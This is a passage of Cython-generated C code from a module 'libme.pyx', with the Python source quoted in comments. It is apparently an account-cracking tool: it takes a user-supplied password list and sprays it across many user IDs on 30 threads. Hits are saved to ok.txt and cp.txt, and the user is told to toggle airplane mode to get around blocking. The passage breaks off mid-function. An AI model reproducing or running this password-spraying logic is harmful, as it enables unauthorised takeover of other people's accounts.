 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 */
    /*with:*/ {
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 446, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 446, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 446, __pyx_L1_error)
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_empty_tuple, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 446, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_3 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 446, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_6 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_enter); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 446, __pyx_L14_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 446, __pyx_L14_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __pyx_t_4;
      __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      /*try:*/ {
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_2, &__pyx_t_1, &__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_2);
          __Pyx_XGOTREF(__pyx_t_1);
          __Pyx_XGOTREF(__pyx_t_14);
          /*try:*/ {
            __pyx_v_coeg = __pyx_t_6;
            __pyx_t_6 = 0;

            /* "libme.pyx":447
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")             # <<<<<<<<<<<<<<
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_For_example_separators_44) < 0) __PYX_ERR(0, 447, __pyx_L18_error)

            /* "libme.pyx":448
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")             # <<<<<<<<<<<<<<
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] password minimum 6 characters")
 */
            __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__10, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 448, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_6);
            __pyx_v_listpass = __pyx_t_6;
            __pyx_t_6 = 0;

            /* "libme.pyx":449
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!] password minimum 6 characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
            __pyx_t_7 = PyObject_Length(__pyx_v_listpass); if (unlikely(__pyx_t_7 == ((Py_ssize_t)-1))) __PYX_ERR(0, 449, __pyx_L18_error)
            __pyx_t_13 = ((__pyx_t_7 <= 5) != 0);
            if (__pyx_t_13) {

              /* "libme.pyx":450
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] password minimum 6 characters")             # <<<<<<<<<<<<<<
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
              __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 450, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_6);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

              /* "libme.pyx":449
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!] password minimum 6 characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
            }

            /* "libme.pyx":451
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] password minimum 6 characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 */
            __pyx_t_6 = __Pyx_PyString_FormatSafe(__pyx_kp_s_0_97m_Crack_with_password_0_91m, __pyx_v_listpass); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 451, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_6);
            if (__Pyx_PrintOne(0, __pyx_t_6) < 0) __PYX_ERR(0, 451, __pyx_L18_error)
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

            /* "libme.pyx":452
 * 					exit("\n  [!] password minimum 6 characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")             # <<<<<<<<<<<<<<
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_Ok_result_saved_in_ok_txt) < 0) __PYX_ERR(0, 452, __pyx_L18_error)

            /* "libme.pyx":453
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")             # <<<<<<<<<<<<<<
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 				for user in self.id:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_Cp_result_saved_in_cp_txt) < 0) __PYX_ERR(0, 453, __pyx_L18_error)

            /* "libme.pyx":454
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")             # <<<<<<<<<<<<<<
 * 				for user in self.id:
 * 					uid, name = user.split("|")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_if_no_result_turn_on_airplane_m) < 0) __PYX_ERR(0, 454, __pyx_L18_error)

            /* "libme.pyx":455
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__bapi__,uid, listpass.split(","))
 */
            __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 455, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_6);
            if (likely(PyList_CheckExact(__pyx_t_6)) || PyTuple_CheckExact(__pyx_t_6)) {
              __pyx_t_5 = __pyx_t_6; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
              __pyx_t_8 = NULL;
            } else {
              __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 455, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 455, __pyx_L18_error)
            }
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            for (;;) {
              if (likely(!__pyx_t_8)) {
                if (likely(PyList_CheckExact(__pyx_t_5))) {
                  if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_6 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_6); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 455, __pyx_L18_error)
                  #else
                  __pyx_t_6 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 455, __pyx_L18_error)
                  __Pyx_GOTREF(__pyx_t_6);
                  #endif
                } else {
                  if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_6 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_6); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 455, __pyx_L18_error)
                  #else
                  __pyx_t_6 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 455, __pyx_L18_error)
                  __Pyx_GOTREF(__pyx_t_6);
                  #endif
                }
              } else {
                __pyx_t_6 = __pyx_t_8(__pyx_t_5);
                if (unlikely(!__pyx_t_6)) {
                  PyObject* exc_type = PyErr_Occurred();
                  if (exc_type) {
                    if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                    else __PYX_ERR(0, 455, __pyx_L18_error)
                  }
                  break;
                }
                __Pyx_GOTREF(__pyx_t_6);
              }
              __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_6);
              __pyx_t_6 = 0;

              /* "libme.pyx":456
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 				for user in self.id:
 * 					uid, name = user.split("|")             # <<<<<<<<<<<<<<
 * 					coeg.submit(self.__bapi__,uid, listpass.split(","))
 * 		elif ask == "t":
 */
              __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_user, __pyx_n_s_split); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 456, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_4);
              __pyx_t_10 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
                __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_4);
                if (likely(__pyx_t_10)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                  __Pyx_INCREF(__pyx_t_10);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_4, function);
                }
              }
              __pyx_t_6 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_10, __pyx_kp_s__38) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_kp_s__38);
              __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
              if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 456, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_6);
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              if ((likely(PyTuple_CheckExact(__pyx_t_6))) || (PyList_CheckExact(__pyx_t_6))) {
                PyObject* sequence = __pyx_t_6;
                Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
                if (unlikely(size != 2)) {
                  if (size > 2) __Pyx_RaiseTooManyValuesError(2);
                  else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
                  __PYX_ERR(0, 456, __pyx_L18_error)
                }
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                if (likely(PyTuple_CheckExact(sequence))) {
                  __pyx_t_4 = PyTuple_GET_ITEM(sequence, 0); 
                  __pyx_t_10 = PyTuple_GET_ITEM(sequence, 1); 
                } else {
                  __pyx_t_4 = PyList_GET_ITEM(sequence, 0); 
                  __pyx_t_10 = PyList_GET_ITEM(sequence, 1); 
                }
                __Pyx_INCREF(__pyx_t_4);
                __Pyx_INCREF(__pyx_t_10);
                #else
                __pyx_t_4 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 456, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_10 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 456, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_10);
                #endif
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              } else {
                Py_ssize_t index = -1;
                __pyx_t_9 = PyObject_GetIter(__pyx_t_6); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 456, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_9);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                __pyx_t_15 = Py_TYPE(__pyx_t_9)->tp_iternext;
                index = 0; __pyx_t_4 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_4)) goto __pyx_L27_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_4);
                index = 1; __pyx_t_10 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_10)) goto __pyx_L27_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_10);
                if (__Pyx_IternextUnpackEndCheck(__pyx_t_15(__pyx_t_9), 2) < 0) __PYX_ERR(0, 456, __pyx_L18_error)
                __pyx_t_15 = NULL;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                goto __pyx_L28_unpacking_done;
                __pyx_L27_unpacking_failed:;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                __pyx_t_15 = NULL;
                if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
                __PYX_ERR(0, 456, __pyx_L18_error)
                __pyx_L28_unpacking_done:;
              }
              __Pyx_XDECREF_SET(__pyx_v_uid, __pyx_t_4);
              __pyx_t_4 = 0;
              __Pyx_XDECREF_SET(__pyx_v_name, __pyx_t_10);
              __pyx_t_10 = 0;

              /* "libme.pyx":457
 * 				for user in self.id:
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__bapi__,uid, listpass.split(","))             # <<<<<<<<<<<<<<
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 */
              __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_coeg, __pyx_n_s_submit); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 457, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_10);
              __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_bapi); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 457, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_4);
              __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_v_listpass, __pyx_n_s_split); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 457, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_16);
              __pyx_t_17 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_16))) {
                __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_16);
                if (likely(__pyx_t_17)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
                  __Pyx_INCREF(__pyx_t_17);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_16, function);
                }
              }
              __pyx_t_9 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_16, __pyx_t_17, __pyx_kp_s__12) : __Pyx_PyObject_CallOneArg(__pyx_t_16, __pyx_kp_s__12);
              __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
              if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 457, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_9);
              __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
              __pyx_t_16 = NULL;
              __pyx_t_12 = 0;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
                __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_10);
                if (likely(__pyx_t_16)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
                  __Pyx_INCREF(__pyx_t_16);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_10, function);
                  __pyx_t_12 = 1;
                }
              }
              #if CYTHON_FAST_PYCALL
              if (PyFunction_Check(__pyx_t_10)) {
                PyObject *__pyx_temp[4] = {__pyx_t_16, __pyx_t_4, __pyx_v_uid, __pyx_t_9};
                __pyx_t_6 = __Pyx_PyFunction_FastCall(__pyx_t_10, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 457, __pyx_L18_error)
                __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              } else
              #endif
              #if CYTHON_FAST_PYCCALL
              if (__Pyx_PyFastCFunction_Check(__pyx_t_10)) {
                PyObject *__pyx_temp[4] = {__pyx_t_16, __pyx_t_4, __pyx_v_uid, __pyx_t_9};
                __pyx_t_6 = __Pyx_PyCFunction_FastCall(__pyx_t_10, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 457, __pyx_L18_error)
                __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              } else
              #endif
              {
                __pyx_t_17 = PyTuple_New(3+__pyx_t_12); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 457, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_17);
                if (__pyx_t_16) {
                  __Pyx_GIVEREF(__pyx_t_16); PyTuple_SET_ITEM(__pyx_t_17, 0, __pyx_t_16); __pyx_t_16 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_4);
                PyTuple_SET_ITEM(__pyx_t_17, 0+__pyx_t_12, __pyx_t_4);
                __Pyx_INCREF(__pyx_v_uid);
                __Pyx_GIVEREF(__pyx_v_uid);
                PyTuple_SET_ITEM(__pyx_t_17, 1+__pyx_t_12, __pyx_v_uid);
                __Pyx_GIVEREF(__pyx_t_9);
                PyTuple_SET_ITEM(__pyx_t_17, 2+__pyx_t_12, __pyx_t_9);
                __pyx_t_4 = 0;
                __pyx_t_9 = 0;
                __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_t_17, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 457, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              }
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

              /* "libme.pyx":455
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__bapi__,uid, listpass.split(","))
 */
            }
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "libme.pyx":446
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 */
          }
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          goto __pyx_L23_try_end;
          __pyx_L18_error:;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          /*except:*/ {
            __Pyx_AddTraceback("libme.James.__1000__", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_6, &__pyx_t_10) < 0) __PYX_ERR(0, 446, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_17 = PyTuple_Pack(3, __pyx_t_5, __pyx_t_6, __pyx_t_10); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 446, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_17);
            __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_17, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 446, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_18);
            __pyx_t_13 = __Pyx_PyObject_IsTrue(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            if (__pyx_t_13 < 0) __PYX_ERR(0, 446, __pyx_L20_except_error)
            __pyx_t_19 = ((!(__pyx_t_13 != 0)) != 0);
            if (__pyx_t_19) {
              __Pyx_GIVEREF(__pyx_t_5);
              __Pyx_GIVEREF(__pyx_t_6);
              __Pyx_XGIVEREF(__pyx_t_10);
              __Pyx_ErrRestoreWithState(__pyx_t_5, __pyx_t_6, __pyx_t_10);
              __pyx_t_5 = 0; __pyx_t_6 = 0; __pyx_t_10 = 0; 
              __PYX_ERR(0, 446, __pyx_L20_except_error)
            }
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            goto __pyx_L19_exception_handled;
          }
          __pyx_L20_except_error:;
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_ExceptionReset(__pyx_t_2, __pyx_t_1, __pyx_t_14);
          goto __pyx_L1_error;
          __pyx_L19_exception_handled:;
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_ExceptionReset(__pyx_t_2, __pyx_t_1, __pyx_t_14);
          __pyx_L23_try_end:;
        }
      }
      /*finally:*/ {
        /*normal exit:*/{
          if (__pyx_t_3) {
            __pyx_t_14 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__13, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 446, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          }
          goto __pyx_L17;
        }
        __pyx_L17:;
      }
      goto __pyx_L32;
      __pyx_L14_error:;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L1_error;
      __pyx_L32:;
    }

    /* "libme.pyx":445
 * 		print("  [] Total id -> \033[0;91m%s\033[0;97m"%(len(self.id)))
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 */
    goto __pyx_L13;
  }

  /* "libme.pyx":458
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__bapi__,uid, listpass.split(","))
 * 		elif ask == "t":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
  __pyx_t_19 = (__Pyx_PyString_Equals(__pyx_v_ask, __pyx_n_s_t, Py_EQ)); if (unlikely(__pyx_t_19 < 0)) __PYX_ERR(0, 458, __pyx_L1_error)
  if (__pyx_t_19) {

    /* "libme.pyx":459
 * 					coeg.submit(self.__bapi__,uid, listpass.split(","))
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 */
    /*with:*/ {
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 459, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_6 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 459, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 459, __pyx_L1_error)
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_empty_tuple, __pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 459, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_3 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 459, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_10 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_enter); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 459, __pyx_L33_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_17 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_17)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_17);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_6 = (__pyx_t_17) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_17) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
      __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 459, __pyx_L33_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __pyx_t_6;
      __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      /*try:*/ {
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_14, &__pyx_t_1, &__pyx_t_2);
          __Pyx_XGOTREF(__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_1);
          __Pyx_XGOTREF(__pyx_t_2);
          /*try:*/ {
            __pyx_v_coeg = __pyx_t_10;
            __pyx_t_10 = 0;

            /* "libme.pyx":460
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
